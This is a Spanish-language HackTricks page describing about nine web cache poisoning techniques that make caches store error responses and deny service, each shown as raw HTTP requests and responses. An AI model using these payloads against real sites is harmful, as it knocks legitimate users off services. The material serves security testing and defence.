# Envenenamiento de cach√© para DoS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

{% hint style="danger" %}
En esta p√°gina puedes encontrar diferentes variaciones para intentar hacer que el **servidor web responda con errores** a solicitudes que son **v√°lidas para los servidores de cach√©**
{% endhint %}

* **Tama√±o excesivo de encabezado HTTP (HHO)**

Env√≠a una solicitud con un tama√±o de encabezado mayor al admitido por el servidor web pero menor al admitido por el servidor de cach√©. El servidor web responder√° con un c√≥digo de respuesta 400 que podr√≠a ser almacenado en cach√©:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **Car√°cter meta de HTTP (HMC) y valores inesperados**

Enviar un encabezado que contenga algunos **caracteres meta da√±inos** como `\n` y `\r`. Para que el ataque funcione, primero debes eludir la cach√©.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Un encabezado mal configurado podr√≠a ser simplemente `\:` como encabezado.

Esto tambi√©n podr√≠a funcionar si se env√≠an valores inesperados, como un Content-Type inesperado:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Encabezado sin clave**

Algunos sitios web devolver√°n un c√≥digo de estado de error si **ven algunos encabezados espec√≠ficos** en la solicitud, como con el encabezado _X-Amz-Website-Location-Redirect: someThing_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **Ataque de Sustituci√≥n de M√©todo HTTP (HMO)**

Si el servidor admite cambiar el m√©todo HTTP con encabezados como `X-HTTP-Method-Override`, `X-HTTP-Method` o `X-Method-Override`, es posible solicitar una p√°gina v√°lida cambiando el m√©todo para que el servidor no lo admita y se almacene una respuesta incorrecta:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Puerto sin clave**

Si el puerto en el encabezado del Host se refleja en la respuesta y no se incluye en la clave de cach√©, es posible redirigirlo a un puerto no utilizado:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Denegaci√≥n de Servicio por Redirecci√≥n Larga**

Como en el siguiente ejemplo, x no est√° siendo almacenado en cach√©, por lo que un atacante podr√≠a abusar del comportamiento de la respuesta de redirecci√≥n para hacer que el redireccionamiento env√≠e una URL tan grande que devuelva un error. Entonces, las personas que intenten acceder a la URL sin la clave x sin cach√© recibir√°n la respuesta de error:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizaci√≥n de may√∫sculas y min√∫sculas en el encabezado del host**

El encabezado del host deber√≠a ser insensible a may√∫sculas y min√∫sculas, pero algunos sitios web esperan que est√© en min√∫sculas y devuelven un error si no lo est√°:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizaci√≥n de ruta**

Algunas p√°ginas devolver√°n c√≥digos de error enviando datos URLcodificados en la ruta, sin embargo, el servidor de cach√© URLdecodificar√° la ruta y almacenar√° la respuesta para la ruta URLdecodificada:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Algunos servidores de cach√©, como Cloudflare, o servidores web, detienen las solicitudes GET con un cuerpo, por lo que esto podr√≠a ser abusado para almacenar en cach√© una respuesta inv√°lida:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referencias

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
